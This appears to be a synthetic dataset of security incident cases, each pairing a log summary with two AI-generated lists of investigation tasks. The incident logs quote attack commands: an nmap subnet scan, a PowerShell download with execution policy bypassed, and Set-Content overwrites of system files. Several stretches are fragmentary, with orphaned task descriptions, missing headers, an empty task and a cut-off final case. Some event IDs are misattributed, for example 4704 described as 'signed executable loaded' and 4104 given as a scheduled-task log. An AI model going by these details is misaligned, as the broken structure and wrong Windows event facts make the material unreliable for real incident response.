case_title: Unexpected file modifications detected in multiple critical system configuration files.
case_description: /etc/passwd modified at 14:03 UTC (owner changed from root to UID1001, content appended with new admin entry, checksum changed); /etc/shadow modified at 14:04 UTC (new hash entry, MD5 mismatch flagged by OSSEC); Windows Security log Event ID 4663 for C:\Windows\system32\config\sam at 14:05 UTC, unknown process; syslog entry: 'mkdir /var/tmp/tmpdir' by PID 1523, no known service; PowerShell log: Set-Content -Path C:\windows\system32\config\system at 14:06 UTC; network traffic to 203.0.113.42 on port 443 at 14:02 UTC; integrity monitoring alerts: SHA256 checksums for /etc/passwd, /etc/shadow, C:\windows\system32\config\sam changed relative to baseline; no scheduled tasks or cron jobs match timestamps; new local user 'hacker' created at 14:00 UTC; AV scan flagged C:\windows\system32\config\system as malicious (signature 2026-01).
model_a_tasks:
Task #1  
Title: Verify integrity of critical configuration files against trusted baselines  
Description: Compare the current checksums of /etc/passwd, /etc/shadow, and C:\Windows\System32\config\system with the known-good snapshots stored in the integrity monitoring system. Document any deviations and verify that the baseline versions are unchanged. This will confirm whether the modifications are truly unauthorized.

Task #2  
Title: Identify the processes responsible for the file modifications on Linux  
Description: Inspect the process lineage of the unknown PID that executed 'mkdir /var/tmp/tmpdir' (PID 1523) by querying /proc/<pid>/status and /proc/<pid>/cmdline. Correlate this with system logs (e.g., Syslog, auditd) to determine the parent process and whether it had the privilege to alter /etc/passwd and /etc/shadow. Check for any lingering malicious binaries in the execution path.

Task #3  
Title: Trace the creation and privileges of the new local user “hacker”  
Description: Review user account logs (e.g., /var/log/auth.log, Windows Security logs) to pinpoint the creation event and the account that performed it. Verify the UID/GID and group memberships, and inspect any scheduled tasks or services that may have been assigned to this account. Determine if the account has elevated privileges that could explain subsequent file changes.

Task #4  
Title: Investigate the PowerShell “Set‑Content” command targeting system config  
Description: Pull the full PowerShell transcript for the event at 14:06 UTC, including any scripts or modules loaded prior to the command. Identify the originating process (owner, parent process) and any arguments that hint at the intent (e.g., encryption, persistence). Cross‑reference the command with known attacker techniques (T1059.001) and assess whether it was part of a broader payload.

Task #5  
Title: Examine Windows Security event ID 4663 for changes to C:\Windows\system32\config\sam  
Description: Retrieve the detailed event record, including the user, process ID, and object access right that triggered the event. Validate the integrity of the SAM file by comparing its hash against the baseline and check for orphaned or suspicious accounts within the SAM database. Look for any concurrent activity that might indicate privilege escalation.

Task #6  
Title: Analyze outbound network traffic to 203.0.113.42 on port 443  
Description: Pull the full packet capture (if available) for the traffic at 14:02 UTC, examine TLS handshakes, certificates, and any data fragments for evidence of exfiltration or command‑and‑control activity. Identify the local process/session responsible for the connection and verify whether it aligns with known malicious services or newly created executables.

Task #7  
Title: Assess the legitimacy of the temporary directory creation in /var/tmp  
Description: Investigate the contents of /var/tmp/tmpdir for any dropped payloads, scripts, or configuration files. Determine whether this directory is used by a legitimate application or if it contains signs of persistence mechanisms (e.g., autorun scripts, compromised cron jobs). Validate the ownership and permissions of the directory against expected system defaults.

Task #8  
Title: Search for hidden persistence mechanisms across both Linux and Windows hosts  
Description: Run a comprehensive search for CRON jobs, scheduled tasks, startup folder entries, and registry run keys that might have been added or modified around the timestamps in question. Use forensic tools to inspect hidden or protected files, and confirm whether any of them reference the “hacker” account or unknown executables.

Task #9  
Title: Verify AV signature detection and rule relevance  
Description: Retrieve the AV log entry for signature 2026‑01 that flagged C:\Windows\system32\config\system. Examine the rule definition and the malicious payload characteristics to confirm if this is a false positive or legitimate. If legitimate, fetch the payload’s family, code integrity, and persistence strategy. Consider disabling the rule if it’s a false positive and update the signature database.

Task #10  
Title: Build a coherent incident timeline and determine the root cause  
Description: Order all detected events chronologically, mapping each file modification, account creation, network connection, and process invocation. Correlate with known ATT&CK techniques to identify the attacker’s objectives (e.g., privilege escalation, persistence). Document the likely initial vector, lateral movement, and any compromised assets. This will guide containment and remediation actions.
model_b_tasks:
Task #1  
Title: Correlate file modification timestamps with lineage of modifying processes  
Description: Retrieve detailed process lineage for the unknown process responsible for the Windows Security Event ID 4663 on `C:\Windows\system32\config\sam` and for the PID 1523 that created `/var/tmp/tmpdir`. Map their creation and execution times against the timestamps of `/etc/passwd`, `/etc/shadow`, and `system` file modifications to identify if a single compromise vector spans both Linux and Windows hosts. Use EDR query logs and Sysmon artifacts for accurate parent-child relationships.

Task #2  
Title: Investigate the newly created local user “hacker”  
Description: Query LDAP/WINRM for group memberships, privilege grants, and recent authentication events tied to the “hacker” account created at 14:00 UTC. Examine audit logs for privilege escalations (Event 4720, 4672) involving this account. Determine if “hacker” was used to modify critical files or launch privileged processes.

Task #3  
Title: Validate integrity of Windows system configuration file flagged by AV  
Description: Download a clean baseline copy of `C:\Windows\system32\config\system` from a current Microsoft release and compare against the flagged file’s SHA256. Run static analysis with AV engines and a sandbox (Cuckoo, FireEye) to observe loading behavior and detectable changes. Confirm if the file contains injected code or modified sections that could alter OS functionality.

Task #4  
Title: Acquire and analyze outbound network traffic to 203.0.113.42  
Description: Dump NetFlow/Zeek logs or pcap segments for traffic to 203.0.113.42 on port 443 at 14:02 UTC. Perform reverse DNS, WHOIS, and IP reputation checks on the IP. Identify protocol details (TLS handshake, SNI, ciphers) and any HTTP/S payloads for command-and-control or exfiltration activities.

Task #5  
Title: Reconstruct Linux host forensic timeline for file modifications  
Description: Consolidate `journalctl`, `/var/log/auth.log`, and `/var/log/syslog` entries from 14:00-14:06 UTC. Use tools like `log2timeline` or `thehive` SOAR playbooks to build a chronological sequence of events, including PID 1523 actions, `passwd`/`shadow` edits, and any sudo sessions. Highlight privilege escalation events and anomalous process creations.

Task #6  
Title: Scrutinize Windows Security logs for ancillary suspicious activity  
Description: Search for additional Event ID 4663 on system files, Event 4704 (Signed executable loaded), Event 4688 (Process creation), and privilege escalation events around the same timeframe. Extract command lines, parent processes, and user accounts involved. Correlate findings with Task 1 to build a cohesive attack narrative across OS boundaries.

Task #7  
Title: Forensically examine contents of /var/tmp/tmpdir  
Description: Collect all artifacts created by PID 1523, including binaries, scripts, and config files. Perform static analysis, hash comparison to known-malicious repositories, and runtime sandboxing if executable. Determine if this directory served as a staging ground for payload delivery or lateral movement.

Task #8  
Title: Verify and fortify integrity monitoring configuration  
Description: Audit OSSEC and any complementary integrity tools for correctness of file monitoring scope and baseline versions. Confirm that prior checksums for `/etc/passwd`, `/etc/shadow`, and `sam` were computed against immutable snapshots. Investigate potential tampering of monitoring binaries or configurations that might allow stealth modifications.

Task #9  
Title: Assess escalation path on Linux hosts post `/etc/passwd` modification  
Description: Check if UID 1001 now possesses sudo privileges or is part of `wheel`/`sudo` groups. Inspect `/etc/group`, `/etc/sudoers`, and associated policy files. Evaluate the risk scope of this privilege escalation and identify potential lateral movement opportunities from the compromised account.

case_title: Suspicious enumeration activity targeting domain resources
case_description:
- Windows Security Log: Event ID 4624 – successful logon for user "attacker@corp.local" from IP 203.0.113.42 (Account type: User).  
- Windows Security Log: Event ID 4648 – attempted logon using explicit credentials for "Administrator@corp.local" from same IP.  
- Sysmon Log: Process creation – cmd.exe executing "whoami /all" and "net group /domain" commands from 203.0.113.42.  
- Trident IDS Alert: Multiple SMB enumeration attempts discovered on internal host 10.10.1.5, port 445, 12 SYN packets from 203.0.113.42.  
- Nmap scan report: Port scan of internal subnet 10.10.1.0/24 from 203.0.113.42 identified open ports 135, 137, 138, 139, 445.  
- DNS Query Log: 203.0.113.42 queried SRV records "_ldap._tcp.corp.local", "_msdcs.corp.local", and PTR records for 10.10.1.5, 10.10.1.10.  
- Splunk Search: LDAP search query for users matching "*", returned 128 objects, originates from 203.0.113.42.  
- Security Camera (Palo Alto) Log: Traffic from external IP 203.0.113.42 to internal IP 10.10.1.5 displaying SMB protocol negotiation attempts.  
- Firewall Log: Denied traffic from 203.0.113.42 to multiple internal IPs on ports 135 and 445; 23 connection attempts recorded.  
- Email Monitor: Alert for phishing link to "login.corp.local" received from 203.0.113.42, accessed by internal user "jdoe@corp.local" (false positive, but related to enumeration).
model_a_tasks:
Task #1  
Title: Validate attacker@corp.local logon authenticity  
Description: Query Windows Security Log for event 4624 to confirm the successful logon of attacker@corp.local from 203.0.113.42, including logon type, source computer, and related session ID. Compare with event 4648 for explicit credential usage and review any subsequent failed (4625) or successful (4624) logons for other accounts to detect credential reuse or unauthorized activity. Verify that attacker@corp.local is a legitimate user and was not recently created or synchronized from an external source.

Task #2  
Title: Correlate cmd.exe enumeration with SMB/LDAP traffic  
Description: Search Sysmon logs for cmd.exe processes running "whoami /all" and "net group /domain" and align their timestamps with SMB traffic on port 445 and LDAP queries from 203.0.113.42. Examine the details of each SMB session for share enumeration or file access attempts and cross‑reference with LDAP search results returned in Splunk. Determine whether the enumeration activity is part of a legitimate administrative task or a malicious reconnaissance effort.

Task #3  
Title: Review SMB enumeration attempts on 10.10.1.5  
Description: Inspect IDS and firewall logs for SMB protocol negotiation packets and SYN packets on port 445 initiated by 203.0.113.42 toward 10.10.1.5. Investigate whether any SMB sessions were established, identify which shares were queried, and look for evidence of file access or command execution. Verify whether the interaction aligns with normal user behavior or indicates lateral movement.

Task #4  
Title: Analyze DNS queries for malicious service discovery  
Description: Parse DNS logs for SRV queries "_ldap._tcp.corp.local" and "_msdcs.corp.local", along with PTR queries for hosts 10.10.1.5 and 10.10.1.10 from 203.0.113.42. Confirm that these queries resolve to legitimate internal resources and that no unexpected domain names or IPs are returned. Cross‑reference the query patterns against known malicious domain behavior and flag any anomalous requests.

Task #5  
Title: Block attacker IP on firewall and monitor impact  
Description: Create a temporary firewall rule to block inbound outbound traffic from 203.0.113.42 on ports 135, 139, and 445 to all internal hosts. Enable logging for blocked attempts to confirm the rule’s effectiveness. Verify that legitimate traffic is not affected and schedule a review after 24 hours to determine if the rule should be permanently applied or adjusted.

Task #6  
Title: Assess the impact of the phishing link accessed by jdoe  
Description: Retrieve proxy or web gateway logs for jdoe@corp.local to confirm that the "login.corp.local" link was visited from 203.0.113.42. Check whether jdoe entered credentials on that page and whether any authentication attempts from jdoe’s account to the attacker IP occurred post‑click. Evaluate the risk of credential compromise and initiate a password reset if necessary.

Task #7  
Title: Gather sysmon and event logs from 10.10.1.5 and 10.10.1.10  
Description: Collect Windows Security and Sysmon logs from the internal hosts that were SSRV queried and experienced SMB enumeration. Run a timeline of events from 24 hours before to after the detected activity, focusing on logon events, new process creations, and file accesses. Look for any anomalies such as unexpected scheduled tasks, service installations, or unusual process names that could indicate post‑exploitation.

Task #8  
Title: Analyze LDAP search payload and objects retrieved  
Description: Examine the Splunk search query that returned 128 objects for patterns of privilege escalation, such as membership in Domain Admins or other privileged groups. Cross‑reference the returned objects with the domain’s Active Directory schema to identify high‑value targets. Flag any accounts or service principals that the attacker may have accessed or reused.

Task #9  
Title: Verify privileged account access with attacker credentials  
Description: Search for events 4624 and 4648 involving privileged accounts such as Administrator@corp.local, Domain Admins, or Enterprise Admins from 203.0.113.42 during the activity window. Check for event 4672 indicating the assignment of special privileges and use of elevated tokens. Document any successful privileged logons or elevation attempts for incident response escalation.

Task #10  
Title: Search for credential dumping activity on internal hosts  
Description: Query Sysmon logs on 10.10.1.5, 10.10.1.10, and other domain controllers for known indicators of credential dumping (e.g., process creation of mimikatz.exe, exploring LM hashes, or usage of WMI DLL import). Review Windows Security Log for event 4663 (file access) and 4670 (permissions change) that might indicate tampering with Credential Manager or SYSTEM. If any indicators are found, isolate the affected host and run a full memory acquisition for deeper analysis.

Description: Query Active Directory for attacker@corp.local properties: last password set date, password expiry, lockout status, and group memberships. Compare login history with typical usage patterns. If anomalies detected, consider the account compromised and trigger remediation.

Task #2

Determine if attacker’s credential attempts succeeded via other channels (e.g., SMB sessions found later).

Task #4

Description: Gather Sysmon logs for SMB session creation involving host 10.10.1.5. Identify any attempted SMB volume enumeration, share discovery, or anonymous access attempts. Look for usage of tools like enum4linux or SMBExec for advanced enumeration.

Description: Investigate 23 denied attempts to ports 135 and 445. Cross-check with packet captures for SYN packets from 203.0.113.42 to internal IPs. Look for subsequent legitimate SMB connections or authentication attempts initiated after firewall blockage.

Task #7
Title: Track phishing link engagement by user jdoe@corp.local
Description: Inspect jdoe’s browser and system logs around the time they accessed login.corp.local. Search for credential dumping, keylogging, or remote shell establishment following link click. Verify if user credentials were harvested or compromised.

Task #8

Description: Query security logs for logins from host 10.10.1.5 under attacker or Administrator accounts. Examine RDP (3389), NTRM (135), WMI, PSExec, or other remote execution tool usage. Identify connections from 10.10.1.5 to other internal hosts on privileged ports.

Task #9
Title: Perform host-based hunting on workstation 10.10.1.5
Description: Collect EDR snapshots: process lists, registry hives, scheduled tasks, startup items. Scan for new persistence mechanisms created after enumeration. Look for hidden or disguised attacker tools, encoded payloads, or web shells deployed.

Task #10
Title: Scrutinize domain controller authentication logs
Description: Pull event 4624, 4625, and 4776 logs from all DCs. Filter by Source IP 203.0.113.42, destination host 10.10.1.5. Verify if any successful authentication occurred using attacker or impersonated credentials. Confirm any suspicious authentication attempts from compromised accounts.

Task #11
Title: Gather threat intelligence on IP 203.0.113.42
Description: Query commercial (e.g., VirusTotal, AlienVault OTX) and open-source (e.g., Abuse.ch, PassiveTotal) feeds for activity reports on this IP. Check for involvement in domain enumeration or credential theft campaigns. Store intelligence for future correlation.

Task #12
Title: Verify integrity of user jdoe@corp.local after phishing exposure
Description: Inspect jdoe’s security principal details: last successful login, MFA enabled status, abnormal login locations. Search for evidence of credential theft or exfiltration from their workstation. Enforce password reset and MFA reinforcement if compromise suspected.

Task #13
Title: Check for unauthorized account modifications or privilege escalations
Description: Filter AD change logs (4700-4709) for any addition of users to privileged groups or creation of service accounts after enumeration. Verify that no new domain admin accounts were added or existing privileges elevated. Reconcile with attacker activity timeline.

Task #14
Title: Review persistence mechanisms tied to attacker accounts or processes
Description: Search Windows Task Scheduler logs and service registry keys for new entries created after enumeration. Check for scheduled tasks (4104 logs), services (7045 logs), or startup keys pointing to attacker-hosted binaries. Ensure any discovered persistence measures are disabled and investigated.

Task #15
Title: Recommend containment and remediation actions
Description: Isolate compromised host 10.10.1.5, reset attacker@corp.local password, revoke any suspicious group memberships. Update firewall rules to block unsolicited traffic from 203.0.113.42 to internal SMB/RPC services. Enforce MFA for privileged accounts, limit administrative tool usage, and conduct post‑incident training focusing on phishing awareness.

case_title: Unexpected modification of a critical Windows system file detected during a low‑activity period.
case_description:
- Sysmon EventID 12: FileCreate for **C:\Windows\System32\drivers\ngen.exe** at 2024‑02‑28 04:12:33 Z, PID 1092, parent process smss.exe, user NT AUTHORITY\SYSTEM.  
- SHA‑256 hash changed from 2d42e3b8a1c7… to 9bf3c5d7a2e9… in the new file.  
- Timestamp altered from 2024‑01‑15 09:30:00 Z to 2024‑02‑28 04:12:33 Z.  
- Windows Security log EventID 4663: FILE_OBJECT accessed for write; AccessMask includes FILE_WRITE_DATA; User NT AUTHORITY\SYSTEM; Source Network Address 0.0.0.0.  
- Wazuh IDS alert (ID 104) for file integrity change on **C:\Windows\System32\drivers\ngen.exe**.  
- ACL change: new entry for user "haxor" with Full Control permissions added to file.  
- Process tree shows **powershell.exe** (PID 1128) invoked via **cmd.exe** (PID 1076) with argument `-Command Set-Content -Path "C:\Windows\System32\drivers\ngen.exe" -Value ...`.  
- Network flow: outbound TLS to 198.51.100.23:443 at 2024‑02‑28 04:12:35 Z immediately following the modification.  
- Task Scheduler logs show no scheduled task or system update occurring during that window.  
- Application event logs: EventID 1000 from ngen.exe provider reports a crash after the modification.
model_a_tasks:
Task #1  
Title: Verify integrity of ngen.exe against a trusted baseline  
Description: Retrieve the current SHA‑256 hash of C:\Windows\System32\drivers\ngen.exe and compare it to the hash recorded in a known, trusted baseline repository (e.g., Microsoft’s signed binary catalog). Use Sigcheck or Windows Defender to confirm the file’s digital signature is valid. If a discrepancy exists, confirm that the file was deliberately replaced and not part of a legitimate update.

Task #2  
Title: Validate the Sysmon EventID 12 details for ngen.exe creation  
Description: Examine the Sysmon event that reported the creation of ngen.exe, noting the creating PID (1092/smss.exe) and the parent-child chain. Cross‑check for any additional file creation events at the same timestamp to determine if smss.exe legitimately spawns ngen.exe or if the process hierarchy indicates tampering. Verify that the event’s timestamps align with the overall timeline of the alert.

Task #3  
Title: Recover and decode the PowerShell command that overwrote ngen.exe  
Description: Search Windows PowerShell logs (Event ID 4104 or 4201) for the command line that includes `-Command Set-Content`. Extract and decode any Base64‑encoded or obfuscated script blocks. Verify whether the command references a remote server or contains malicious payload chains.

Task #4  
Title: Investigate the creation and privileges of user “haxor”  
Description: Audit security logs for user account creation events (Event IDs 4720, 4724) to determine when “haxor” was added and its group memberships. Confirm whether the account has administrative rights or has been granted Local System privileges. Correlate the ACL change with the file modification timestamp to assess whether the new user was added by the attacker.

Task #5  
Title: Correlate outbound TLS traffic to suspicious IP with the modification event  
Description: Use NetFlow or packet‑capture logs to isolate traffic to 198.51.100.23:443 that occurred immediately after the file change. Examine the payload (HTTP request/response) for indicators of command‑and‑control activity or unusual data exfiltration. Check threat‑intelligence feeds for reputational data on the IP.

Task #6  
Title: Search for persistence mechanisms installed during the attack window  
Description: Query registry Run/RunOnce keys under HKLM and HKCU, inspect scheduled task logs, and examine boot/configuration data for newly created entries. Correlate any new persistence objects with the original Sysmon event timestamps to determine if the attacker established long‑term footholds.

Task #7  
Title: Perform static analysis of the modified ngen.exe binary  
Description: Use tools such as PEiD, CFF Explorer, and VirusTotal to inspect imports, strings, sections, and the digital signature of the tampered file. Identify any anomalous sections or injected code that was not present in the original ngen.exe. Compare the metadata against the known good binary for a thorough assessment.

Task #8  
Title: Execute the modified ngen.exe in a sandboxed environment  
Description: Run the altered binary inside a controlled VM or sandbox and monitor file system, registry, and network activity. Capture any persistence attempts, network connections, and system crashes that occur. Use the sandbox output to confirm whether the crash logged in Event ID 1000 is due to malicious code.

Task #9  
Title: Scan for additional compromised system files  
Description: Review file integrity monitoring logs (e.g., Wazuh, Sysmon Event IDs 12, 13) to identify other critical system files that were modified or created during the same timeframe. Compare their hashes to trusted baselines to detect broader tampering. Prioritize alerts for files that are known to be high‑impact targets.

Task #10  
Title: Investigate credential‑dumping or lateral‑movement indicators  
Description: Search for security events around the same period (Event IDs 4624, 4625, 4672, 4768) that may indicate brute‑force or pass‑the‑hash attempts. Look for Sysmon EventIDs 11, 1, or 10 that reveal the use of tools such as Mimikatz or PsExec. Correlate any such activity with the ngen.exe modification to assess lateral movement possibilities.

Task #11  
Title: Examine Windows System and Application logs for related anomalies  
Description: Review System and Application logs (Event IDs 4608–4609, 4663, 4670) for unusual service starts, driver loads, or driver write operations around the same timestamps. Identify any other processes (e.g., smss.exe, cmd.exe, powershell.exe) that displayed anomalous behavior. Cross‑reference these findings with the current alert to build a comprehensive timeline.

Task #12  
Title: Contain the host, remediate, and update detection rules  
Description: Isolate the affected system from the network, replace the compromised ngen.exe with a known good version, and perform a full anti‑malware scan. Audit all user accounts for excessive permissions and review ACLs for any remaining unwanted entries. Update SIEM and SOAR rules to detect similar file integrity changes, PowerShell obfuscation, and outbound TLS to suspicious IPs in the future.

Task #1  
Title: Identify and profile the “haxor” user account  
Description: Pull all attributes of the “haxor” account from Active Directory, including creation date, last logon timestamp, group memberships, and password policies. Verify whether this account is business‑legitimate (e.g., test account) or anomalous, and search authentication, event, and audit logs for any activity by “haxor” or token impersonations around 2024‑02‑28 04:12:33 Z. Flag any suspicious logins, lateral movements, or failed authentication attempts that could indicate compromise.

Task #2  
Title: Validate the legitimacy of smss.exe spawning cmd.exe  
Description: Review Sysmon EventID 10 and Windows System logs to confirm that smss.exe legitimately spawned cmd.exe during the low‑activity period. Compare the resulting child cmd.exe’s command line, start time, and parent‑child relationship against established baseline behavior documented for your environment. Any deviation, such as unexpected cmd.exe launches from smss.exe, may signal malicious activity or privilege escalation attempts.

Task #3  
Title: Analyze the PowerShell execution context  
Description: Extract the full command line and the ScriptBlockText of powershell.exe (PID 1128). Determine whether the script was inline, loaded from a temporary file, or passed the –EncodedCommand flag. Inspect the script for obfuscation, base64 encoding, the use of banned cmdlets, or references to system binaries, which are red flags for malicious intent.

Task #4  
Title: Decode and examine the Set‑Content payload  
Description: Retrieve the literal value passed to the –Value parameter of the Set‑Content cmdlet. If the payload is base64‑encoded binary, decode it and perform static analysis to uncover potential malicious code, scripts, or stagers. Identify whether the payload is written directly to ngen.exe or to a temporary assembly that later replaces ngen.exe, indicating a classic “write‑executable” persistence technique.

Task #5  
Title: Trace the outbound TLS session to 198.51.100.23 :443  
Description: Using network flow logs, NetFlow, and endpoint connection monitoring, isolate the process that initiated the TLS handshake. Cross‑reference the destination IP with threat intelligence feeds such as VirusTotal, AbuseIPDB, and MITRE ATT&CK STIX. Determine whether the outbound traffic is associated with command‑and‑control, data exfiltration, or benign updates, and document any findings for further analysis.

Task #6

case_title: Suspicious network scanning activity detected from external IP during off-hours.
case_description: - Firewall logs show 1,250 inbound SYN packets to ports 20‑25, 80, 443, and 3389 from IP 203.0.113.21 over a 5‑minute window with high source port numbers. - SNORT IDS rule 20148 (“TCP Port Scan”) triggered with severity high, source IP 203.0.113.21. - NetFlow data records 3,165 distinct flows from 203.0.113.21 to 192.168.1.0/24 during the same period. - Ping sweep detected: ICMP echo requests to every host in 192.168.1.0/24 from 203.0.113.21. - Windows Sysmon logs on host 192.168.1.50 record a ProcessCreate event for “nmap.exe” (command line “nmap -sS -p- 192.168.1.0/24”) at 02:12 UTC. - A new binary “C:\Temp\nmap_scanner.exe” was created on host 192.168.1.50 at 02:15 UTC, matching the hash 3f4e6d…5b7a. - PowerShell execution observed on the same host: “powershell.exe -NoProfile -ExecutionPolicy Bypass –Command …” at 02:16 UTC, used to download the nmap executable from the external IP. - Router console logs indicate a burst of TCP SYN packets forwarded to backend servers on ports 21‑49446 originating from 203.0.113.21. - Threat intelligence feed identifies 203.0.113.21 as a known scanner with historical activity in the past 30 days. - SIEM alert “High Priority: Port Scan Detected” generated at 02:10 UTC with correlation ID 8F3B-01A4. - Packet capture file “/var/log/pkt/scan_dump_0210.pcap” contains raw traffic samples of the scan activity.
model_a_tasks:
Task #1  
Title: Correlate external IP with threat intelligence  
Description: Pull up all available intel on 203.0.113.21 from the threat intel feed, including historical sightings, known malicious activity, and associated malware families. Compare this data against internal logs to confirm that the IP has not previously engaged in legitimate activity within our environment.

Task #2  
Title: Analyze packet capture for inbound scan patterns  
Description: Open `/var/log/pkt/scan_dump_0210.pcap` in Wireshark or a similar tool to verify that the traffic matches a typical TCP SYN scan. Identify target ports, scan rate, and any payload anomalies that could indicate a custom scanner or exploitation attempts.

Task #3  
Title: Verify legitimacy of the nmap binary  
Description: Compute the file hash of `C:\Temp\nmap_scanner.exe` and compare it against the official Nmap download hash. If it differs, flag it as a malicious modification and begin a deeper static analysis to determine its behavior and origin.

Task #4  
Title: Search for persistence mechanisms on host 192.168.1.50  
Description: Inspect the host’s scheduled tasks, registry Run/RunOnce keys, WMI subscriptions, and any hidden services that were created around the time of the scan. This helps determine whether the attacker has left a foothold for future activity.

Task #5  
Title: Correlate Sysmon logs for suspicious activity after 02:17 UTC  
Description: Review Sysmon logs for additional ProcessCreate, FileCreate, and NetworkConnect events. Look for outbound connections to 203.0.113.21 or other external addresses, creation of new processes, or unusual command lines that may indicate exploitation or data exfiltration.

Task #6  
Title: Inspect firewall and router logs for anomalous outbound traffic  
Description: Examine outbound firewall and router logs for traffic originating from 192.168.1.50 after the scan window, especially to unknown external IPs or non‑standard ports. Flag any high‑volume transfers as potential data leakage.

Task #7  
Title: Compare NetFlow data against baseline behavior  
Description: Contrast the 3,165 flows recorded for 203.0.113.21 with normal network traffic for the 192.168.1.0/24 subnet. Highlight any destinations or flow volumes that deviate significantly from expected patterns.

Task #8  
Title: Check for lateral movement from host 192.168.1.50  
Description: Trace any RDP (TCP 3389), SMB (TCP 445), or other credential‑based connections originating from the infected host to other internal machines during the incident window. Investigate any such connections for signs of compromise.

Task #9  
Title: Validate removal and sanitisation of malicious payload  
Description: After isolating the host, ensure that `nmap_scanner.exe` and any related files are deleted, that running instances of the binary are terminated, and that memory services are cleared. Run an updated antivirus/EDR scan to confirm no residual malware remains.

Task #10  
Title: Compile incident report and update playbooks  
Description: Document the timeline of events, findings, response actions, and any gaps observed. Use this information to refine existing detection rules and update playbooks for future port‑scanning incidents.
model_b_tasks:
Task #1  
Title: Validate source IP against threat intel  
Description: Cross‑check the external source IP, 203.0.113.21, with current threat intelligence feeds for known malicious actor activity. Confirm that this IP is not a false positive or legitimate partner by reviewing internal whitelists and past incident records.

Task #2  
Title: Correlate firewall and IDS logs for scan pattern confirmation  
Description: Map inbound SYN packet counts and target port distribution from firewall logs against SNORT rule 20148 triggers. Identify any anomalies such as unusual port ranges or scanning intervals that may indicate evasive tactics.

Task #3  
Title: Inspect packet capture in detail  
Description: Use Wireshark to filter and analyze /var/log/pkt/scan_dump_0210.pcap for TCP SYN flags, source/destination port sequences, and protocol anomalies. Document packet metadata to reconstruct the scanning vector and detect potential fragmented or stealthy packets.

Task #4  
Title: Analyze NetFlow data for scan metrics  
Description: Parse NetFlow records for source IP 203.0.113.21, calculating total flows, unique destination IPs, and port coverage. Compare flow density against typical scanning thresholds to gauge severity and potential reconnaissance intent.

Task #5  
Title: Identify internal hosts scanned  
Description: Cross‑reference destination IPs from NetFlow and pcap with the internal asset inventory. Create a checklist of scanned hosts, noting those with exposed critical services such as RDP or SMB, and prioritize them for further investigation.

Task #6  
Title: Confirm Sysmon ProcessCreate legitimacy  
Description: Analyze the Sysmon ProcessCreate event for “nmap.exe” with command line “nmap -sS -p- 192.168.1.0/24”. Verify the binary’s location matches known nmap installation paths or flag anomalous directories for deeper inspection.

Task #7  
Title: Check digital signature of downloaded binary  
Description: Compute the hash of C:\Temp\nmap_scanner.exe and compare it to known-good signatures and the threat intelligence database. If hash 3f4e6d…5b7a is not recognized as legitimate, treat the binary as potentially malicious and quarantine it.

Task #8  
Title: Decode PowerShell execution logs  
Description: Examine the PowerShell command “powershell.exe -NoProfile -ExecutionPolicy Bypass –Command …” for obfuscation or encoded script. Identify the source URL used to download the nmap executable and assess whether it points to a known malicious domain.

Task #9  
Title: Search for persistence mechanisms  
Description: Review Windows registry hives (HKLM, HKCU) for autorun keys, scheduled tasks, winlogon entries, and other persistence vectors introduced during the scanning period. Flag any anomalies for removal and further forensic analysis.

Task #10  
Title: Acquire forensic images of affected hosts  
Description: Perform offline disk imaging of host 192.168.1.50 and any other hosts identified in Task #5. Capture volatile memory snapshots to preserve running processes, DLLs, and network connections for subsequent analysis.

Task #11  
Title: Investigate lateral movement indicators  
Description: Analyze logs for SMB file share usage, RDP connections from non‑standard IPs, and new service creation on internal hosts scanned. Combine with Security Event logs to map potential exploitation paths and detect post‑scan activity.

Task #12  
Title: Run host integrity and malware scans  
Description: Deploy endpoint threat detection tools to scan for rootkits, backdoors, and exfiltration indicators. Use file integrity monitoring to detect unauthorized changes to critical binaries and operating system components.

Task #13  
Title: Block external source IP at perimeter  
Description: Update firewall rule sets to deny all inbound traffic from 203.0.113.21 immediately. Monitor for rerouting attempts or use of proxies to circumvent the block, and update the block list as new indicators emerge.

Task #14  
Title: Update threat intel feeds with new indicators  
Description: Submit findings, including IP address, new hash value, and observed tactics, techniques, and procedures (TTPs), to shared threat intelligence platforms such as TAXII services and the cybersecurity community.

Task #15  
Title: Compile incident report with findings and recommendations  
Description: Gather all evidence, analysis results, and containment actions into a structured report. Include a definitive timeline, risk assessment, root cause, and actionable recommendations for hardening, monitoring enhancements, and future response planning.

case_title: Suspicious enumeration of domain accounts and shares from internal workstation
case_description: Windows Event 4624 logs show successful logons of account testsvc from IP 10.2.3.4 to domain controller 10.2.3.2; Windows Event 4625 logs record five failed attempts from the same workstation to privileged domain accounts; SMB logs capture numerous SMB2_COMMAND_QUERY_INFO requests targeting all shares on the DCs; NetFlow data reveals ~30 MB of outbound traffic from 10.2.3.4 to port 445 across multiple domain controllers; DNS logs display 200 random A‑record queries for unused subdomains; PowerShell event 4688 records execution of “Get‑ADUser –Filter *” and “Get‑ADComputer –Filter *” on that workstation; object access audit (4662) entries indicate access to shared document folders; no scheduled task correlates with these activities; the purpose and legitimacy of testsvc account and the enumeration remain unclear and warrant additional investigation.
model_a_tasks:
**Task #1**  
**Title:** Verify the legitimacy and scope of the testsvc account  
**Description:**  
Query Active Directory to retrieve the account’s attributes (creation date, owner, OU placement, group memberships, GPO assignments). Compare with the baseline of standard service accounts. Verify that the account does not possess excessive privileges (e.g., Domain Admin, Enterprise Admin). Check for any recent changes or unusual modifications. Gather the results to confirm whether the account aligns with internal policies or represents a potential security risk.

---

**Task #2**  
**Title:** Correlate legitimate logons of testsvc with failed domain logon attempts  
**Description:**  
Extract the 4624 logs for the testsvc account and map each successful logon to the corresponding 4625 failed attempts. Verify timing proximity and same source IP (10.2.3.4). Confirm whether the failed attempts targeted privileged accounts that testsvc possesses credentials for. This correlation will help determine if the enumeration is part of a credential‑dumping or brute‑force attempt.

---

**Task #3**  
**Title:** Investigate SMB2_QUERY_INFO activity for anomalous share enumeration  
**Description:**  
Collect detailed SMB logs (SMB2_COMMAND_QUERY_INFO) from all domain controllers. Identify the list of shares queried and the frequency of requests. Cross‑reference with legitimate share access patterns for the user’s OU. Highlight any shares normally unavailable or that are rarely accessed. Use these findings to determine if the workstation is performing an aggressive inventory or probing for vulnerabilities.

---

**Task #4**  
**Title:** Analyze NetFlow data for unusual outbound SMB traffic patterns  
**Description:**  
Review the 30 MB of traffic from 10.2.3.4 to port 445 across multiple DCs. Compare packet volume, flow duration, and source/destination pairs against baseline SMB traffic. Look for anomalies such as repeated sequential queries, large data transfers, or connections to unexpected controllers. Any deviations may indicate exfiltration or lateral movement attempts.

---

**Task #5**  
**Title:** Scrutinize DNS query logs for suspicious random name resolution  
**Description:**  
